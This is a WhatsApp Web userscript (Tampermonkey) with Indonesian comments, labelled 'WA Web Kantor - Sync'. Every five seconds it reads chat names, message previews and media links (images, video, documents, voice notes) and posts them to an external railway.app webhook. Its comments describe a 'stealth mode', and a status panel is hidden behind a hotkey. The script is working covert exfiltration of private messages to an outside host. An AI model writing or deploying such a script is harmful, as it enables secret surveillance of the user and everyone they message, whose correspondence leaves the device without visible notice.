// ==UserScript==
// @name         WA Web Kantor - Sync
// @namespace    http://tampermonkey.net/
// @version      2.0
// @description  WA Web Kantor Sync
// @match        https://web.whatsapp.com/*
// @grant        GM_xmlhttpRequest
// @run-at       document-idle
// ==/UserScript==

(function() {
    'use strict';

    // ============ KONFIGURASI ============
    const SERVER_URL = 'https://wa-kantor-telegram-production.up.railway.app/webhook';
    const MEDIA_URL = 'https://wa-kantor-telegram-production.up.railway.app/webhook/media';

    const CHECK_INTERVAL = 5000;
    const AUTO_MEDIA_SYNC = true;

    // ============ STATE ============
    let lastChats = new Map();
    let lastMediaHashes = new Set();
    let isConnected = false;
    let debugMode = false; // Tekan Ctrl+Shift+W untuk toggle debug

    // ============ UI TERSEMBUNYI ============
    // Panel debug tersembunyi — hanya muncul dengan hotkey
    function createHiddenUI() {
        // Panel log tersembunyi (bisa dipanggil dengan hotkey)
        const panel = document.createElement('div');
        panel.id = 'waSyncPanel';
        panel.style.cssText = 'position:fixed;bottom:10px;left:10px;z-index:999999;display:none;';
        panel.innerHTML = `
            <div style="background:#1a1a2e;color:#00ff00;border-radius:12px;padding:16px;font-family:monospace;font-size:12px;width:320px;box-shadow:0 8px 32px rgba(0,0,0,0.3);">
                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">
                    <span style="color:#fff;font-size:13px;">📡 Sync Status</span>
                    <span id="waSyncStatus" style="color:#ff4444;font-size:11px;">Offline</span>
                </div>
                <div id="waSyncLog" style="max-height:150px;overflow-y:auto;line-height:1.6;"></div>
            </div>
        `;
        document.body.appendChild(panel);

        // Hotkey: Ctrl+Shift+W untuk toggle panel debug
        document.addEventListener('keydown', (e) => {
            if (e.ctrlKey && e.shiftKey && e.key === 'W') {
                e.preventDefault();
                const p = document.getElementById('waSyncPanel');
                p.style.display = p.style.display === 'none' ? 'block' : 'none';
            }
        });
    }

    function log(msg) {
        if (!debugMode) return;
        const logDiv = document.getElementById('waSyncLog');
        const time = new Date().toLocaleTimeString('id-ID');
        if (logDiv) {
            logDiv.innerHTML = `[${time}] ${msg}<br>` + logDiv.innerHTML;
        }
    }

    // ============ SERVER ============
    function checkServer() {
        GM_xmlhttpRequest({
            method: 'GET',
            url: SERVER_URL.replace('/webhook', '/status'),
            timeout: 5000,
            onload: (r) => {
                if (r.status === 200) {
                    isConnected = true;
                    const statusEl = document.getElementById('waSyncStatus');
                    if (statusEl) { statusEl.textContent = 'Online ✅'; statusEl.style.color = '#00ff00'; }
                    log('✅ Server online');
                }
            },
            onerror: () => {
                isConnected = false;
                const statusEl = document.getElementById('waSyncStatus');
                if (statusEl) { statusEl.textContent = 'Offline ❌'; statusEl.style.color = '#ff4444'; }
                log('❌ Server offline');
            },
            ontimeout: () => {
                log('❌ Connection timeout');
            }
        });
    }

    function sendToServer(data) {
        if (!isConnected) return;

        GM_xmlhttpRequest({
            method: 'POST',
            url: SERVER_URL,
            headers: { 'Content-Type': 'application/json' },
            data: JSON.stringify({ ...data, timestamp: new Date().toISOString() }),
            onload: () => log('✅ Terkirim'),
            onerror: () => log('❌ Gagal kirim')
        });
    }

    // ============ MONITOR ============
    function startMonitor() {
        log('🚀 Monitoring started (stealth mode)');
        takeSnapshot();
        checkServer();

        setInterval(() => {
            checkNewMessages();
            checkNewMedia();
        }, CHECK_INTERVAL);
    }

    function takeSnapshot() {
        const chats = getAllChats();
        lastChats.clear();
        chats.forEach(c => lastChats.set(c.name, c));
    }

    function getAllChats() {
        const chats = [];
        document.querySelectorAll('div[data-testid="chat-list"] > div').forEach(el => {
            const nameEl = el.querySelector('span[title]');
            const previewEl = el.querySelector('div[class*="copyable-text"] span');
            const unreadEl = el.querySelector('span[data-testid="ui-unread-count"]');
            if (nameEl) {
                chats.push({
                    name: nameEl.getAttribute('title'),
                    preview: previewEl ? previewEl.textContent : '',
                    unread: unreadEl ? parseInt(unreadEl.textContent) : 0
                });
            }
        });
        return chats;
    }

    function checkNewMessages() {
        const chats = getAllChats();
        const newMsgs = [];

        chats.forEach(chat => {
            const last = lastChats.get(chat.name);
            if (!last) {
                newMsgs.push({ type: 'new_chat', chat: chat.name, preview: chat.preview });
            }
            else if (chat.unread > 0 && chat.preview !== last.preview) {
                newMsgs.push({ type: 'new_message', chat: chat.name, preview: chat.preview, unread: chat.unread });
            }
        });

        lastChats.clear();
        chats.forEach(c => lastChats.set(c.name, c));

        if (newMsgs.length > 0) {
            sendToServer({ type: 'new_messages', messages: newMsgs });
            log('📩 ' + newMsgs.length + ' notif');
        }
    }

    // ============ MEDIA SYNC ============
    function hashMedia(url) {
        let hash = 0;
        for (let i = 0; i < url.length; i++) {
            const char = url.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }
        return hash.toString(36);
    }

    function getOpenChatName() {
        const titleEl = document.querySelector('header span[title]');
        return titleEl ? titleEl.getAttribute('title') : 'Unknown';
    }

    function getMediaFromOpenChat() {
        const media = [];
        const chatName = getOpenChatName();

        document.querySelectorAll('div[style*="background-image"]').forEach(el => {
            const style = el.getAttribute('style') || '';
            if (style.includes('blob:') || style.includes('whatsapp') || style.includes('base64')) {
                const bgi = style.match(/url\(["']?([^"')]+)["']?\)/);
                if (bgi && bgi[1]) {
                    media.push({ type: 'image', url: bgi[1], chat: chatName });
                }
            }
        });

        document.querySelectorAll('div[class*="message"] img[src]').forEach(img => {
            const src = img.src;
            if (src && (src.includes('whatsapp') || src.includes('mm-image') || src.includes('blob:'))) {
                media.push({ type: 'image', url: src, chat: chatName });
            }
        });

        document.querySelectorAll('video[src]').forEach(vid => {
            const src = vid.src;
            if (src && (src.includes('whatsapp') || src.includes('blob:'))) {
                media.push({ type: 'video', url: src, chat: chatName });
            }
        });

        document.querySelectorAll('div[aria-label="Video"]').forEach(el => {
            const vid = el.querySelector('video');
            if (vid && vid.src) {
                media.push({ type: 'video', url: vid.src, chat: chatName });
            }
        });

        document.querySelectorAll('div[class*="document"] a[href]').forEach(a => {
            const href = a.href;
            if (href && href.length > 20) {
                media.push({ type: 'document', url: href, chat: chatName });
            }
        });

        document.querySelectorAll('div[aria-label="Audio"], div[aria-label="Voice Message"]').forEach(el => {
            const audio = el.querySelector('audio');
            if (audio && audio.src) {
                media.push({ type: 'audio', url: audio.src, chat: chatName });
            }
        });

        return media;
    }

    function sendMediaToServer(mediaItem) {
        const h = hashMedia(mediaItem.url);
        if (lastMediaHashes.has(h)) return;
        lastMediaHashes.add(h);

        if (lastMediaHashes.size > 200) {
            const arr = Array.from(lastMediaHashes);
            lastMediaHashes = new Set(arr.slice(-100));
        }

        GM_xmlhttpRequest({
            method: 'POST',
            url: MEDIA_URL,
            headers: { 'Accept': 'application/json' },
            data: JSON.stringify({
                mediaType: mediaItem.type,
                mediaUrl: mediaItem.url,
                chatName: mediaItem.chat,
                caption: '',
                timestamp: new Date().toISOString()
            }),
            onload: () => log('✅ Media: ' + mediaItem.type),
            onerror: () => log('❌ Gagal kirim media')
        });
    }

    function checkNewMedia() {
        if (!AUTO_MEDIA_SYNC) return;
        const media = getMediaFromOpenChat();
        media.forEach(m => sendMediaToServer(m));
    }

    // ============ INIT ============
    if (document.readyState === 'complete') {
        setTimeout(() => {
            createHiddenUI();
            startMonitor();
        }, 3000);
    } else {
        window.addEventListener('load', () => {
            setTimeout(() => {
                createHiddenUI();
                startMonitor();
            }, 3000);
        });
    }
})();
